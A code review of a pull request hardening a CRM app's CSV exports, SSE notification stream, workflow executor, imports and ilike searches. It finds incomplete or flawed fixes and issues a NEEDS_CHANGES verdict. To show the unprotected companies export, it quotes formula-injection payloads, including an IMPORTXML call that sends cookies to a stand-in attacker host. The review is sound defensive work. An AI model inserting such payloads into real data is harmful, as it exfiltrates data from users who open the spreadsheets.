# Security hardening and defensive fixes across export, SSE, workflow, and import paths

This batch fixes eight distinct bugs in a single branch: CSV formula injection in exports, SSE stream resource leaks on disconnect, workflow executor cycle detection, invalid date crash in deals import, fail-open default in automation condition evaluation, missing client-side file size check in the import modal, and unescaped SQL wildcards in ilike queries. The approach is targeted — each fix is small, focused on one failure mode, and the test file covers the formula injection and fail-closed operator behavior.

Watch for: The formula injection prefix (`-` in `FORMULA_PREFIXES`) will mangle legitimate negative numbers and international phone numbers in exported CSVs (confirmed). The companies export and audit export routes still carry the old unprotected `escapeCSV` — the fix is inconsistently applied across all export surfaces (confirmed). The SSE stream has a double-close race between the error-threshold path and the abort handler (confirmed).

**Verdict**: NEEDS_CHANGES

## High-level view

The CSV formula injection fix neutralizes `=`, `+`, `-`, `@`, `\t`, `\r` prefixes by prepending a single quote before CSV quoting. This is the OWASP-recommended approach but it has collateral damage: any legitimate value starting with `-` or `+` (negative amounts, phone numbers) gets a visible `'` prefix in spreadsheet applications. The fix was applied to `lib/export/index.ts` and the deals export consolidated to use it, but the companies export route and the audit log CSV export still define their own unprotected `escapeCSV` inline — a company named `=CMD("calc")` will still inject.

The SSE notification stream now closes the controller on client abort and after 3 consecutive DB errors. Both paths call `controller.close()` without guarding against the other having already closed it, creating a race that will throw `TypeError` in the abort handler if the error threshold fires first.

The workflow executor's cycle detection adds a `visited` Set passed through recursive calls. This prevents infinite recursion on cyclic graphs and also deduplicates execution for DAG convergence points — each node runs at most once regardless of how many edges lead to it. For workflows with intentional fan-in (two branches merging), only the first branch's traversal will trigger the shared node.

The wildcard escaping for ilike queries (`%` and `_`) was applied to the contacts list route and the export function's contacts query, but the same unescaped pattern exists in at least eight other routes (deals, companies, tasks, bulk endpoints, superadmin). The fix is correct where applied but incomplete as a security posture.

The fail-closed default in `meetsConditions` and `evaluateCondition` changes unknown operators from `return true` (match everything) to `return false` (match nothing). This is the safe direction — a typo in an operator name will block the automation rather than fire it indiscriminately.

## Formula injection prefix and collateral damage on numeric values

The `escapeCSV` function applies the single-quote prefix to any string whose first character is in `FORMULA_PREFIXES`:

```typescript
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];
if (str.length > 0 && FORMULA_PREFIXES.includes(str[0]!)) {
  str = "'" + str;
}
```

This works correctly for actual formula payloads, but `'-'` is included without a numeric exemption. The deals export calls `escapeCSV(r.amount)` where `amount` is a `decimal(15,2)` field. A refund recorded as `-500.00` exports as `'-500.00`. Similarly, phone numbers with international format (`+1-555-0101`) become `'+1-555-0101` — and the contacts export runs every field through `escapeCSV`, including `phone`.

A minimal fix: if `str` matches `/^[+-]?\d/` (starts with sign-then-digit), skip the prefix. This preserves injection protection for `+CMD()` while passing through `+1-555` and `-500`.

## Incomplete consolidation of escapeCSV across export routes

The deals export was correctly refactored to `import { escapeCSV } from '@/lib/export'`. But the companies export at `app/api/tenant/companies/export/route.ts` still defines its own:

```typescript
function escapeCSV(val: unknown): string {
  const s = String(val ?? "");
  if (s.includes(",") || s.includes('"') || s.includes("\n")) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}
```

No formula prefix. A company named `=IMPORTXML("http://evil.com/steal","//cookies")` exports unprotected. The audit log export at `app/api/tenant/audit/export/route.ts` has the same issue — it constructs CSV manually with inline quoting and no prefix.

## SSE stream double-close between error threshold and abort

The stream now has two independent close paths:

```
Path A (error threshold):  consecutiveErrors >= 3 → clearInterval(interval/keepalive) → controller.close()
Path B (client disconnect): abort signal fires → clearInterval(interval/keepalive) → controller.close()
```

If Path A fires first, the intervals are cleared and the controller is closed. The abort listener remains registered (there's no `removeEventListener`). When the client eventually disconnects (which will happen since the response stream is closed), the abort handler fires, calls `clearInterval` on already-cleared handles (harmless), then calls `controller.close()` on an already-closed controller. The Web Streams spec throws `TypeError: Controller is already closed` in this case. Since this is inside an event listener with no try-catch, it becomes an unhandled exception.

Fix: either wrap the abort handler's `controller.close()` in a try-catch, or track a `let closed = false` flag that both paths check before calling close.

## Wildcard escaping scope

The PR correctly identifies that `%` and `_` in user search terms act as SQL wildcards inside `ilike()`. The fix:

```typescript
const escapedQ = q.replace(/%/g, "\\%").replace(/_/g, "\\_");
```

This is applied in two places: `contacts/route.ts` GET handler and `lib/export/index.ts` `generateExportData`. But the identical vulnerable pattern appears in `deals/route.ts` line 54, `companies/route.ts` line 37, `contacts/bulk/route.ts`, `deals/bulk/route.ts`, `companies/bulk/route.ts`, `tasks/bulk/route.ts`, `tickets/bulk/route.ts`, and the superadmin search routes. The `escapeIlikeWildcards` helper in `lib/export/index.ts` is not exported, so other routes can't reuse it. Export the helper and apply it in all ilike sites, or extract it to a shared utility module.

## Cycle detection semantics in workflow executor

The `visited` Set is passed by reference through all recursive `executeNode` calls from a single root invocation. This means it functions as a "global visited" rather than a "recursion stack." The distinction matters for DAGs:

```
       trigger
       /    \
   condA    condB
       \    /
       action_X
```

If `condA`'s branch reaches `action_X` first, it executes and marks it visited. When `condB`'s branch later tries to execute `action_X`, it returns immediately. For cycle prevention this is correct — but for "execute once per path" semantics where `action_X` should fire for each satisfied condition, it's a behavior change. The prior code (without cycle detection) would have executed `action_X` twice in this DAG. Whether this is a regression depends on whether any deployed workflows use fan-in patterns.

## Test coverage gaps

The test file covers formula injection thoroughly (13 cases) and verifies the fail-closed operator default. Missing from the test suite:

- The SSE stream fixes (controller.close on abort, error threshold) are not unit-tested. The stream handler requires mocking `NextRequest`, `db`, and the streaming infrastructure.
- The date validation in deals import is not tested — no test exercises the `isNaN(parsedDate.getTime())` path.
- The ilike escaping has no unit test verifying that `%` and `_` are escaped.
- The cycle detection test (`'evaluateCondition with unknown operator returns false'`) doesn't actually test cycle detection — it only checks that `executeWorkflow` is importable.
